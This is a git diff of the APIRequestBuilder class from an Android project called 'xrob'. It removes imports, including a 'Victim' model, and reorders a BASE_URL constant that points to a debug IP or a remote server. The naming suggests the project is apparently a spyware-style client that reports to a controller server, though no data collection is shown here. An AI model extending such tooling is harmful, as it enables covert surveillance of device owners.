@@ -2,11 +2,6 @@ package com.theah64.xrob.utils;
 
 import android.util.Log;
 
-import com.theah64.xrob.models.Victim;
-
-import java.io.UnsupportedEncodingException;
-import java.net.URLEncoder;
-
 import okhttp3.FormBody;
 import okhttp3.Request;
 
@@ -16,12 +11,10 @@ import okhttp3.Request;
  */
 public class APIRequestBuilder {
 
-    private static final String BASE_URL = Xrob.IS_DEBUG_MODE ? "http://192.168.43.234:8080/xrob/v1" : "http://theapache64.xyz:8080/xrob/v1";
-    //private static final String BASE_URL = "http://xrob-theapache64.rhcloud.com/v1";
-
-    private static final String X = APIRequestBuilder.class.getSimpleName();
     public static final String KEY_AUTHORIZATION = "Authorization";
-
+    //private static final String BASE_URL = "http://xrob-theapache64.rhcloud.com/v1";
+    private static final String BASE_URL = Xrob.IS_DEBUG_MODE ? "http://192.168.43.234:8080/xrob/v1" : "http://theapache64.xyz:8080/xrob/v1";
+    private static final String X = APIRequestBuilder.class.getSimpleName();
     private final Request.Builder requestBuilder = new Request.Builder();
     private final StringBuilder logBuilder = new StringBuilder();
 
